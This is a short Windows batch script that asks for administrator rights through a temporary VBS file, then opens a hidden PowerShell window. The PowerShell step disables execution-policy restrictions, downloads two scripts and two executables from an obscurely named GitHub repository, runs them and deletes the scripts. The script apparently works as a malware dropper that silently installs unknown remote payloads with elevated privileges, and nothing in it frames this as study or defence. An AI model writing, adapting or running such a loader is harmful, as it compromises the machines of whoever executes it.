@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges, press yes to continue...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
cd %TEMP%
Powershell -WindowStyle hidden -Command "Set-ExecutionPolicy unrestricted -Force; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/putamadre.ps1' -OutFile main.ps1; .\main.ps1; Remove-Item main.ps1; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/mierda.ps1' -OutFile yes.ps1; .\yes.ps1; Remove-Item yes.ps1; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/aserv.exe' -OutFile cli.exe; .\cli.exe; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/mainserv.exe' -OutFile server.exe; .\server.exe"